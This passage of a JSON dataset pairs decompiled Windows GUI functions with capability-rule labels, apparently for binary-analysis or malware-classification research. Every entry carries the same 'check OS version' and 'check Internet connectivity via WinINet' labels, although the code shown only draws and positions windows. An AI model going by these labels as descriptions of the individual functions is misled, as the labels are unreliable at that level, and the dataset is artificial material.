        "decompiled_code": "\nvoid __fastcall fcn.0043e15c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint arg_ch;\n    uint arg_10h;\n    uchar auStack28 [16];\n    \n    fcn.0042f140();\n    cVar1 = fcn.0042f220();\n    if (((cVar1 == '\\0') || (in_EAX[0xc] == 0)) || ((*(in_EAX + 0x52) & 4) == 0)) {\n        if ((*(in_EAX + 0x7e) == '\\0') || (*(param_2 + 4) == *(param_2 + 8))) {\n            uVar2 = fcn.0041d0f0();\n            (**(*in_EAX + 0x44))(uVar2);\n            sub.user32.dll_FillRect(*(param_2 + 4), auStack28);\n        }\n    }\n    else {\n        arg_10h = 0;\n        arg_ch = 0;\n        uVar2 = 0;\n        fcn.0043fd08();\n        fcn.0042f3b8(uVar2, arg_ch, arg_10h);\n    }\n    *(param_2 + 0xc) = 1;\n    return;\n}\n",
        "token_count": 303
    },
    "0043e48c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043e48c(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43e56b;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*(*0x462210 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x188) != 0) {\n            fcn.00457344();\n            iVar2 = fcn.00407ce0();\n            puVar1 = puStack24;\n            if (iVar2 != 0) {\n                piVar3 = fcn.00457144();\n                iVar2 = (**(*piVar3 + 0x14))();\n                puVar1 = puStack24;\n                if (iVar2 != 0) {\n                    uVar4 = *(**0x4621e4 + 0x3c);\n                    if (*(in_EAX + 0x184) != '\\0') {\n                        piVar3 = fcn.00457144();\n                        iVar2 = (**(*piVar3 + 0x54))();\n                        if (-1 < iVar2) {\n                            uStack28 = 0x43e532;\n                            piVar3 = fcn.00457144();\n                            uStack28 = 0x43e539;\n                            uVar4 = (**(*piVar3 + 0x18))();\n                        }\n                    }\n                    uStack28 = 1;\n                    uStack32 = uVar4;\n                    sub.user32.dll_ActivateKeyboardLayout();\n                    puVar1 = puStack24;\n                }\n            }\n        }\n        puStack24 = puVar1;\n        fcn.0043fd08();\n        fcn.004448f8();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x43e572;\n    uStack28 = 0x43e56a;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 513
    },
    "0043e578": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043e578(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffe0;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x43e602;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack24;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x462210 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x188) != 0) {\n            fcn.00457344();\n            iVar2 = fcn.00407ce0();\n            puVar1 = puStack16;\n            if (iVar2 != 0) {\n                in_stack_ffffffe0 = *(**0x4621e4 + 0x3c);\n                sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffe0, 1);\n                puVar1 = puStack16;\n            }\n        }\n        puStack16 = puVar1;\n        puVar1 = puStack16;\n        if (*(in_EAX + 0x184) == '\\0') {\n            fcn.0043fd08();\n            fcn.004448dc();\n            puVar1 = puStack16;\n        }\n    }\n    puStack16 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffe0;\n    uStack24 = 0x43e609;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 384
    },
    "0043e664": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e664(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.00412720();\n    iVar1 = fcn.0043a6d4(arg_8h_00);\n    if ((-1 < iVar1) && (*(in_EAX + 0x1b2) != 0)) {\n        (**(in_EAX + 0x1b0))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "0043e6b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e6b4(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1ba) != 0) {\n        (**(in_EAX + 0x1b8))(arg_8h, arg_10h & 0xffffff00 | arg_ch & 0xff, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0043e7dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e7dc(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint uStack8;\n    \n    var_8h = *arg_ch;\n    uStack8 = arg_ch[1];\n    uVar1 = fcn.0043fd08();\n    sub.user32.dll_GetWindowRect(uVar1);\n    sub.user32.dll_InflateRect();\n    if (*(in_EAX + 0x1d2) != 0) {\n        (**(in_EAX + 0x1d0))(arg_8h, &var_8h);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0043e838": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0043e838(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0043e7a4();\n    if ((0 < iVar1) && (iVar3 = iVar1 + -1,  -1 < iVar3)) {\n        do {\n            iVar2 = fcn.00413b64();\n            if (*(iVar2 + 0x57) == '\\0') {\n                iVar1 = iVar1 + -1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 148
    },
    "0043e8e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e8e4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43e98c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((param_2 != *(in_EAX + 0x1a8)) && (*(in_EAX + 0x1a8) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) {\n        fcn.004371d8();\n        if (param_2 == '\\0') {\n            fcn.00403258();\n            *(in_EAX + 0x178) = 0;\n            fcn.00405648();\n        }\n        else {\n            if (*(in_EAX + 0x178) == 0) {\n                uVar1 = fcn.00403228();\n                *(in_EAX + 0x178) = uVar1;\n            }\n            fcn.00403454();\n            fcn.00405660();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x43e993;\n    uStack28 = 0x43e98b;\n    fcn.00405648();\n    return;\n}\n",
        "token_count": 349
    },
    "0043e99c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e99c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        iVar1 = *(param_2 + 4);\n        var_18h = *(iVar1 + 0x44);\n        uStack24 = *(iVar1 + 0x48);\n        uStack20 = *(iVar1 + 0x4c);\n        uStack16 = *(iVar1 + 0x50);\n        uStack44 = 2;\n        puStack48 = &fcn.0043e99c::var_18h;\n        uStack52 = 0x43e9d6;\n        var_8h = param_2;\n        var_4h = in_EAX;\n        uStack52 = fcn.0043fd08();\n        uStack56 = 0;\n        puStack60 = 0x43e9de;\n        sub.user32.dll_MapWindowPoints();\n        puStack60 = 0x43e9e6;\n        fcn.0043c5a0();\n        uStack64 = 0x43ea5e;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.00403454();\n        if ((*(var_4h + 0x1a7) != '\\0') && (*(var_4h + 0x17c) != 0)) {\n            (**(**(var_4h + 0x17c) + 0x18))(*(*(var_8h + 4) + 0x58));\n        }\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x43ea65;\n        uStack64 = 0x43ea5d;\n        fcn.0043c5a8();\n        return;\n    }\n    return;\n}\n",
        "token_count": 536
    },
    "0043ea88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ea88(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 0xc) = 0;\n    if ((*(in_EAX + 0x1a7) != '\\0') && (*(in_EAX + 0x17c) != 0)) {\n        (**(**(in_EAX + 0x17c) + 0x28))();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0043eab0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043eab0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x43eac5;\n    iVar2 = (**(*in_EAX + 0x58))();\n    puStack24 = 0x43eacf;\n    iVar3 = fcn.004031a0();\n    if (iVar2 == iVar3) {\n        cVar1 = *(in_EAX + 0x57);\n        uStack28 = 0x43eb1a;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00403454();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x43eb2b;\n        if (cVar1 != '\\0') {\n            uStack28 = 0x43eb19;\n            fcn.0043978c();\n        }\n        return;\n    }\n    puStack24 = 0x43eb2b;\n    fcn.0043b394();\n    return;\n}\n",
        "token_count": 297
    },
    "0043eb34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043eb34(uint param_1)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1da) != 0) {\n        (**(in_EAX + 0x1d8))(param_1);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0043eb5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043eb5c(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.004506c0();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x22d) != '\\0')) {\n        cVar1 = fcn.0043eb5c();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x0043ebb9;\n    }\n    uVar2 = fcn.004505c8();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.00403454();\n        if (*(param_2 + 4) == 0) goto code_r0x0043ebb9;\n    }\n    uVar4 = 0;\ncode_r0x0043ebb9:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 306
    },
    "0043ec44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043ec44(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.004506c0();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x22d) != '\\0')) {\n        cVar1 = fcn.0043ec44();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x0043eca1;\n    }\n    uVar2 = fcn.004505c8();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.00403454();\n        if (*(param_2 + 4) == 0) goto code_r0x0043eca1;\n    }\n    uVar4 = 0;\ncode_r0x0043eca1:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 304
    },
    "0043ecec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043ecec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1e2) != 0) {\n        (**(in_EAX + 0x1e0))();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "0043ed0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043ed0c(uint32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.004506c0();\n    uStack20 = param_1;\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x22d) != '\\0')) {\n        cVar2 = fcn.0043ed0c();\n        if (cVar2 != '\\0') goto code_r0x0043ed68;\n    }\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        uVar1 = *(param_2 + 4);\n        uStack20 = param_1 & 0xffffff00 | uVar1;\n        fcn.00403454();\n        *(param_2 + 4) = uVar1;\n        if (*(param_2 + 4) == '\\0') goto code_r0x0043ed68;\n    }\n    uVar4 = 0;\ncode_r0x0043ed68:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 320
    },
    "0043efac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043efac(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        *(param_2 + 0xc) = 1;\n        return;\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 105
    },
    "0043efd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0043efd0(uint param_1, uint8_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = fcn.004387f8();\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar3 = fcn.0043ca38();\n        iVar3 = iVar3 + -1;\n        if (-1 < iVar3) {\n            do {\n                if ((param_2 & uVar2) != 0) break;\n                fcn.0043c9fc();\n                uVar1 = fcn.00403454();\n                uVar2 = uVar2 & 0xffffff00 | uVar2 | uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != -1);\n        }\n    }\n    return CONCAT14(param_2, uVar2);\n}\n",
        "token_count": 220
    },
    "0043f084": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f084(uint param_1, int32_t param_2)\n\n{\n    fcn.0043b1a8();\n    if ((*(*0x462210 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        fcn.0043d2a8();\n    }\n    fcn.0043ca98();\n    return;\n}\n",
        "token_count": 92
    },
    "0043f19c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043f19c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x57) == '\\0') && (*(in_EAX + 0x30) != 0)) {\n        fcn.0043c7f8();\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || ((*(in_EAX + 0x51) & 4) != 0)) {\n        fcn.0043d3fc();\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0043f1f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043f1f4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = (**(*in_EAX + 0x50))();\n    if ((cVar1 == '\\0') && (in_EAX[0xc] != 0)) {\n        fcn.0043c7f8();\n    }\n    cVar1 = fcn.0044000c();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 0x10) == 0)) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        sub.user32.dll_EnableWindow(in_EAX[0x60], -(cVar1 != '\\0'));\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "0043f2e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043f2e0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    \n    (**(*in_EAX + -0x10))();\n    cVar1 = fcn.0044000c();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.0043fd08(0, 0, 0, 0, 0, 0x37);\n        sub.user32.dll_SetWindowPos(uVar2);\n        if (*(in_EAX + 0x57) != '\\0') {\n            (**(*in_EAX + 0x7c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0043f320": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043f320(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x50) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        cVar1 = fcn.0044000c();\n        if (cVar1 != '\\0') {\n            iVar2 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x180));\n            if (iVar2 != 0) {\n                fcn.0043fc10();\n            }\n        }\n    }\n    fcn.0043ca98();\n    return;\n}\n",
        "token_count": 156
    },
    "0043f44c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.0043f44c(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack20;\n    \n    uVar1 = uStack20;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (in_EAX != 0) {\n            do {\n                iVar2 = fcn.00403454();\n                if ((iVar2 != 0) && (*(iVar2 + 0x38) != 0)) {\n                    uVar3 = fcn.00403454();\n                    if (uVar3 != '\\0') goto code_r0x0043f4d5;\n                }\n                in_EAX = *(in_EAX + 0x30);\n            } while (in_EAX != 0);\n        }\n        iVar2 = fcn.004506c0();\n        if (iVar2 != 0) {\n            uVar3 = fcn.00403454();\n            if (uVar3 != '\\0') goto code_r0x0043f4d5;\n        }\n    }\n    uVar3 = fcn.00436414();\n    if (uVar3 == 0) {\n        uStack20 = uVar1 & 0xffffff00;\n    }\ncode_r0x0043f4d5:\n    return CONCAT44(uStack20, uVar3 & 0xffffff00 | uStack20 & 0xff);\n}\n",
        "token_count": 362
    },
    "0043f8c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f8c0(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack32;\n    \n    iVar4 = *(in_EAX + 0x180);\n    if ((iVar4 == 0) || (iVar3 = sub.user32.dll_IsWindowVisible(),  iStack32 = iVar4,  iVar3 == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        sub.user32.dll_ScrollWindow(*(in_EAX + 0x180), iStack32, param_2, 0, 0);\n    }\n    iVar4 = fcn.0043ca38();\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.0043c9fc();\n            cVar2 = fcn.004033e4();\n            if ((cVar2 == '\\0') || (*(iVar3 + 0x180) == 0)) {\n                *(iVar3 + 0x40) = *(iVar3 + 0x40) + iStack32;\n                *(iVar3 + 0x44) = *(iVar3 + 0x44) + param_2;\n            }\n            else if (!bVar1) {\n                iStack32 = *(iVar3 + 0x180);\n                sub.user32.dll_SetWindowPos();\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.0043c5c8();\n    return;\n}\n",
        "token_count": 385
    },
    "0043f9b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f9b0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = *(*(in_EAX + 0x30) + 0x198);\n        if (iVar2 != 0) {\n            param_2 = param_2 - *(iVar2 + 8);\n        }\n        iVar2 = fcn.00413bc0();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x19c) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.00413a54();\n                fcn.00413be0();\n            }\n        }\n        if (*(in_EAX + 0x180) != 0) {\n            if (param_2 == 0) {\n                uVar3 = 1;\n            }\n            else if (param_2 == *(*(*(in_EAX + 0x30) + 0x19c) + 8) + -1) {\n                uVar3 = 0;\n            }\n            else if (iVar2 < param_2) {\n                fcn.00413b64();\n                uVar3 = fcn.0043fd08();\n            }\n            else {\n                if (iVar2 <= param_2) {\n                    return;\n                }\n                fcn.00413b64();\n                uVar3 = fcn.0043fd08();\n            }\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x180), uVar3, 0, 0, 0, 0, 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 453
    },
    "0043fce4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043fce4(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x60] == 0) {\n        if (in_EAX[0xc] != 0) {\n            fcn.0043fce4();\n        }\n        (**(*in_EAX + 0x94))();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0044000c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0044000c(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x180) != 0;\n}\n",
        "token_count": 49
    },
    "00440130": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
